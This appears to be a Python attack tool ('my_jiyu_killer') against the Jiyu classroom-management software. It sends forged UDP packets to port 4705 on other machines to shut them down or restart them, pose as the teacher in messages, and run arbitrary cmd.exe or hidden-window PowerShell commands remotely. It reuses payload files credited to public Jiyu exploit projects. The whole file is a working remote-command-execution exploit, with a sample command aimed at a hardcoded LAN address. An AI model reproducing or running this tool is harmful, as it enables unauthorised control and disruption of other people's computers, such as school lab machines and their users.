import logging
import os
import socket
import sys
from dataclasses import dataclass
from logging import Logger, StreamHandler, Formatter
from typing import Tuple, List, TextIO

logger: Logger = logging.getLogger("my_jiyu_killer")
logger.setLevel(logging.DEBUG)

console_handler: StreamHandler[TextIO] = logging.StreamHandler()
console_handler.setLevel(logging.DEBUG)

formatter: Formatter = logging.Formatter(
    fmt="[%(asctime)s] [%(funcName)s/%(levelname)s]: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)
console_handler.setFormatter(formatter)

logger.addHandler(console_handler)


@dataclass()
class Payload:
    """
    预构造的数据包。
    SHUTDOWN: 关机
    RESTART: 重启
    MSG: 教师端消息
    CMD: 执行指令
    """
    SHUTDOWN: bytes = bytes()
    RESTART: bytes = bytes()
    MSG: bytes = bytes()
    CMD: bytes = bytes()


def _resource_dir(relative_dir: str) -> str:
    """
    将资源的相对路径转换为实际路径。
    如果已使用 PyInstaller 打包为可执行文件，使用 sys 的 _MEIPASS 属性。
    否则引用原绝对路径。
    :param relative_dir: 资源的相对路径
    :return: 资源的实际路径
    """
    if hasattr(sys, "_MEIPASS"):
        # noinspection PyProtectedMember
        base_dir = sys._MEIPASS
    else:
        base_dir = os.path.abspath(".")
    return os.path.join(base_dir, relative_dir)


def read_payload(shutdown_dir: str, restart_dir: str, msg_dir: str, cmd_dir: str) -> None:
    """
    从资源文件读取预构造的数据包。注意：传入的路径应该是已经被 _resource_dir 函数处理过的，本函数不会处理路径。
    :param shutdown_dir: 关机数据包路径
    :param restart_dir: 重启数据包路径
    :param msg_dir: 教师端消息数据包路径
    :param cmd_dir: 执行指令数据包路径
    """
    with open(shutdown_dir, "rb") as f:
        Payload.SHUTDOWN = f.read()
    with open(restart_dir, "rb") as f:
        Payload.RESTART = f.read()
    with open(msg_dir, "rb") as f:
        Payload.MSG = f.read()
    with open(cmd_dir, "rb") as f:
        Payload.CMD = f.read()
    logger.info(f"Read payload from: {shutdown_dir}, {restart_dir}, {msg_dir}, {cmd_dir}")


class Target:
    """
    要发送数据的目标主机。
    使用前，应先实例化该类，再调用对象的方法实现。使用示例：

        addr = ("192.168.75.03", 4705) # 包含 IP 地址和服务端口
        target = Target(addr) # 实例化目标主机为 Target 类的对象
        target.msg("Hello world") # 向目标以教师的口吻发送消息
        target.shutdown() # 使目标关机

    """

    def __init__(self, address: Tuple[str, int]) -> None:
        """
        初始化 Target 对象时传入的参数。
        :param address: 包含 IP 地址和端口的元组
        """
        self.address = address

    @staticmethod
    def _format_data(content: str) -> List[int]:
        """
        格式化用于教师端消息的字符串。
        :param content: 原内容
        :return: 格式化后的十六进制列表
        """
        formatted_bytes = []
        for char in content:
            code_point = ord(char)
            if code_point <= 0xFF:
                formatted_bytes.extend([code_point, 0x00])
                continue
            hex_str = hex(code_point)[2:]
            hex_str = hex_str.zfill(4)
            low_byte = int(hex_str[2:4], 16)
            high_byte = int(hex_str[0:2], 16)
            formatted_bytes.extend([low_byte, high_byte])

        return formatted_bytes

    @staticmethod
    def _encode_str(s: str) -> bytes:
        """
        格式化用于执行指令的字符串。
        :param s: 原指令内容
        :return: 格式化后的字节流
        """
        return b"".join(bytes([ord(c), 0]) for c in s)

    def shutdown(self) -> None:
        """
        发送关机指令。
        """
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            try:
                sock.sendto(Payload.SHUTDOWN, self.address)
            except socket.gaierror as e:
                logger.error(f"socket.gaierror: {e}")
                raise
            except OSError as e:
                logger.error(f"OSError ({type(e).__name__}): {e}")
        logger.info(f"Send SHUTDOWN packet to {self.address[0]} on port {self.address[1]}")

    def restart(self) -> None:
        """
        发送重启指令。
        """
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            try:
                sock.sendto(Payload.RESTART, self.address)
            except socket.gaierror as e:
                logger.error(f"socket.gaierror: {e}")
                raise
            except OSError as e:
                logger.error(f"OSError ({type(e).__name__}): {e}")
        logger.info(f"Send RESTART packet to {self.address[0]} on port {self.address[1]}")

    def msg(self, content: str = "") -> None:
        """
        发送教师端消息（即以教师的口吻）。
        :param content: 消息内容
        """
        content = self._format_data(content)
        packet = bytearray(Payload.MSG)
        for idx, element in enumerate(content, start=56):
            packet[idx] = element

        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            try:
                sock.sendto(packet, self.address)
            except socket.gaierror as e:
                logger.error(f"socket.gaierror: {e}")
                raise
            except OSError as e:
                logger.error(f"OSError ({type(e).__name__}): {e}")
        logger.info(f"Send MSG packet to {self.address[0]} on port {self.address[1]}: {content}")

    def cmd(self, command: str, keep_window: bool = False) -> None:
        """
        使目标使用命令提示符 cmd.exe 执行指令。
        :param command: 指令内容
        :param keep_window: 执行后是否保留命令提示符窗口
        """
        cmd_exe_dir = "C:\\WINDOWS\\system32\\cmd.exe"

        cmd_exe_dir = self._encode_str(cmd_exe_dir)
        if keep_window:
            full_command = self._encode_str(f"/k {command}")
        else:
            full_command = self._encode_str(f"/c {command}")

        packet = bytearray(Payload.CMD)
        packet.extend(cmd_exe_dir)
        packet.extend(b"\x00" * (512 - len(cmd_exe_dir)))

        packet.extend(full_command)
        packet.extend(b"\x00" * (324 - len(full_command)))

        packet.extend(b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00")

        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            try:
                sock.sendto(packet, self.address)
            except socket.gaierror as e:
                logger.error(f"socket.gaierror: {e}")
                raise
            except OSError as e:
                logger.error(f"OSError ({type(e).__name__}): {e}")
        logger.info(f"Send CMD packet to {self.address[0]} on port {self.address[1]}: {command}")

    def powershell(self, command: str, keep_window: bool = False) -> None:
        """
        使目标使用 Powershell powershell.exe 执行指令。
        :param command: 指令内容
        :param keep_window: 执行后是否保留 Powershell 窗口
        """
        powershell_exe_dir = "C:\WINDOWS\system32\WindowsPowerShell\v1.0\\powershell.exe"

        powershell_exe_dir = self._encode_str(powershell_exe_dir)
        if keep_window:
            full_command = self._encode_str(f" -NoExit -NoLogo -WindowStyle Hidden -Command \"& {{{command}}}\"")
        else:
            full_command = self._encode_str(f" -NoLogo -WindowStyle Hidden -Command \"& {command}\"")

        logger.debug(f"Command: {full_command}")

        packet = bytearray(Payload.CMD)
        packet.extend(powershell_exe_dir)
        packet.extend(b"\x00" * (512 - len(powershell_exe_dir)))

        packet.extend(full_command)
        packet.extend(b"\x00" * (324 - len(full_command)))

        packet.extend(b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00")

        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            try:
                sock.sendto(packet, self.address)
            except socket.gaierror as e:
                logger.error(f"socket.gaierror: {e}")
                raise
            except OSError as e:
                logger.error(f"OSError ({type(e).__name__}): {e}")
        logger.info(f"Send POWERSHELL packet to {self.address[0]} on port {self.address[1]}: {command}")


def get_localhost() -> str:
    """
    获取本地主机的局域网 IP 地址。
    :return: 本地局域网 IP 地址
    """
    hostname = socket.gethostname()
    lan_ip = socket.gethostbyname(hostname)
    return lan_ip


# from Jiyu_udp_attack (https://github.com/ht0Ruial/Jiyu_udp_attack)
SHUTDOWN_DIR = _resource_dir(".\\assets\\shutdown.bin")
RESTART_DIR = _resource_dir(".\\assets\\restart.bin")
MSG_DIR = _resource_dir(".\\assets\\msg.bin")
# from JiYuHacker (https://github.com/mxym/JiYuHacker)
CMD_DIR = _resource_dir(".\\assets\\cmd.bin")
read_payload(SHUTDOWN_DIR, RESTART_DIR, MSG_DIR, CMD_DIR)

if __name__ == '__main__':
    print("Your IP: ", get_localhost())
    ADDR = ("10.165.43.52", 4705)  # edit this test ip before
    send = Target(ADDR)
    send.powershell("Write-Output This is just a joke. :)", True)
